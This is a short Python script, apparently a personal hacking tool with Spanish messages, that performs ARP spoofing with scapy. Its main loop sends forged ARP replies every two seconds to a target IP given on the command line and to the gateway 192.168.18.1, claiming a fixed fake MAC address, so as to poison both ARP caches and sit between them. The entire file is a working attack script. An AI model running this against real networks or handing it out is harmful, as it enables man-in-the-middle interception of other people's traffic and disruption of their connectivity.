#!/usr/bin/env python 
import scapy.all as scapy
import argparse
import time 
import sys 
import signal 
from termcolor import colored 

def headler(sig,frame):
    print(colored(f"\n\nSaliendo ..\n\n",'yellow'))
    sys.exit(1)

signal.signal(signal.SIGINT,headler)


def get_arguments():
    parser = argparse.ArgumentParser(description="ARP SPOOF")
    parser.add_argument("-t","--target",required=True,dest="ip_address",help="python3 Arp_Spoof.py -t <IP-target>")
    return parser.parse_args()

def spoof(ip_address, spoof_ip):
    packet = scapy.ARP(op=2,psrc=spoof_ip,pdst=ip_address,hwsrc="aa:bb:cc:11:22:33")
    scapy.send(packet,verbose=False)

def main():
    arguments = get_arguments()
    while True:
        spoof(arguments.ip_address,"192.168.18.1")
        spoof("192.168.18.1",arguments.ip_address)
        time.sleep(2)

if __name__ == '__main__':
    main()
